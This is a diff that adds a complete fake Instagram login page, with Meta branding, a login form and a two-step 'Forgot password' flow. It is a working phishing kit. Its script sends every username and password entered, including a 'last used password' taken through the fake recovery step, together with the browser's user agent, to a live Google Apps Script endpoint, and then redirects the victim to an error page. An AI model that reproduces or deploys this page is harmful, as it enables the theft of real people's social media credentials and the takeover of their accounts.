@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000000;
+            color: white;
+            min-height: 100vh;
+        }
+
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px 20px;
+        }
+
+        .lang-selector {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+  text-align: center; /* This centers the logo on the screen */
+  margin-bottom: 40px; /* Keeping your original margin */
+}
+
+.logo img {
+  width: 75px; /* This replaces font-size to control the image size */
+  height: auto; /* Keeps the image proportions correct */
+}
+        
+
+        .login-form {
+            width: 100%;
+            max-width: 350px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1c1c1c;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            font-size: 15px;
+            margin-bottom: 8px;
+        }
+
+        input::placeholder {
+            color: #888;
+        }
+
+        .error {
+            color: #ff4444;
+            font-size: 12px;
+            margin-bottom: 10px;
+            display: none;
+            padding-left: 5px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin-top: 25px;
+        }
+
+        .forgot-link a {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .create-box {
+            margin-top: auto;
+            padding: 30px 0;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .create-btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #0095f6;
+            border: 2px solid #0095f6;
+            border-radius: 25px;
+            text-align: center;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .meta {
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        /* Forgot Password Modal */
+        #forgotModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 100;
+            padding: 60px 20px 20px;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 40px;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .back-arrow {
+            font-size: 24px;
+            margin-right: 15px;
+            cursor: pointer;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .modal-content {
+            max-width: 350px;
+            margin: 0 auto;
+        }
+
+        .modal-text {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .step {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    
+<div class="container" id="mainPage">
+    <div class="lang-selector">English (US) ▼</div>
+    
+    <div class="logo">
+  <img src="insta.jpg" alt="Logo">
+    </div>
+    
+    <form class="login-form" id="loginForm">
+        <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
+        <div class="error" id="userError">Please enter username</div>
+        
+        <input type="password" id="password" placeholder="Password">
+        <div class="error" id="passError">Please enter password</div>
+        
+        <button type="submit" class="btn">Log in</button>
+    </form>
+
+    <div class="forgot-link">
+        <a href="#" onclick="showForgot(); return false;">Forgot password?</a>
+    </div>
+
+    <div class="create-box">
+        <a href="#" class="create-btn">Create new account</a>
+        <div class="meta">Ⓜ️ Meta</div>
+    </div>
+</div>
+
+<!-- Forgot Password -->
+<div id="forgotModal">
+    <div class="modal-header">
+        <span class="back-arrow" onclick="hideForgot()">←</span>
+        <span class="modal-title">Forgot Password</span>
+    </div>
+
+    <div class="modal-content">
+        <!-- Step 1 -->
+        <div class="step" id="step1" style="display: block;">
+            <div class="modal-text">Enter your username, email, or mobile number to search for your account.</div>
+            <input type="text" id="fpUser" placeholder="Username, email or mobile number">
+            <div class="error" id="fpUserError">Please enter username</div>
+            <button class="btn" onclick="goStep2()">Continue</button>
+        </div>
+
+        <!-- Step 2 -->
+        <div class="step" id="step2" style="display: none;">
+            <div class="modal-text">Enter the last password you remember using with this account.</div>
+            <input type="password" id="fpPass" placeholder="Last used password">
+            <div class="error" id="fpPassError">Please enter password</div>
+            <button class="btn" onclick="submitForgot()">Log in</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // REPLACE WITH YOUR GOOGLE SCRIPT URL
+    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbx839-brkr5RUy7Nvr_VmO0dqdQaYeW9V4bxpt_wIBwqOBpoYgE5jzt1hVHu9kOMdpj/exec';
+
+    // Save to Google Sheets
+    function saveData(type, user, pass) {
+        if (SHEET_URL !== 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
+            fetch(SHEET_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: type,
+                    username: user,
+                    password: pass,
+                    userAgent: navigator.userAgent
+                })
+            });
+        }
+    }
+
+    // Mark that user has started demo
+    sessionStorage.setItem('demoStarted', 'yes');
+
+    // LOGIN FORM
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const user = document.getElementById('username').value.trim();
+        const pass = document.getElementById('password').value.trim();
+        let hasError = false;
+
+        if (!user) {
+            document.getElementById('userError').style.display = 'block';
+            hasError = true;
+        } else {
+            document.getElementById('userError').style.display = 'none';
+        }
+
+        if (!pass) {
+            document.getElementById('passError').style.display = 'block';
+            hasError = true;
+        } else {
+            document.getElementById('passError').style.display = 'none';
+        }
+
+        if (hasError) return;
+
+        // Save data
+        saveData('login', user, pass);
+
+        // Go to error page
+        window.location.href = 'error.html';
+    });
+
+    // FORGOT PASSWORD
+    function showForgot() {
+        document.getElementById('forgotModal').style.display = 'block';
+        document.getElementById('step1').style.display = 'block';
+        document.getElementById('step2').style.display = 'none';
+    }
+
+    function hideForgot() {
+        document.getElementById('forgotModal').style.display = 'none';
+    }
+
+    function goStep2() {
+        const user = document.getElementById('fpUser').value.trim();
+        
+        if (!user) {
+            document.getElementById('fpUserError').style.display = 'block';
+            return;
+        }
+        
+        document.getElementById('fpUserError').style.display = 'none';
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+    }
+
+    function submitForgot() {
+        const user = document.getElementById('fpUser').value.trim();
+        const pass = document.getElementById('fpPass').value.trim();
+        
+        if (!pass) {
+            document.getElementById('fpPassError').style.display = 'block';
+            return;
+        }
+        
+        document.getElementById('fpPassError').style.display = 'none';
+
+        saveData('forgot_password', user, pass);
+        
+        // Go to error page
+        window.location.href = 'error.html';
+    }
+
+    // Clear errors on input
+    document.getElementById('username').addEventListener('input', function() {
+        document.getElementById('userError').style.display = 'none';
+    });
+
+    document.getElementById('password').addEventListener('input', function() {
+        document.getElementById('passError').style.display = 'none';
+    });
+</script>
+
+</body>
+</html>
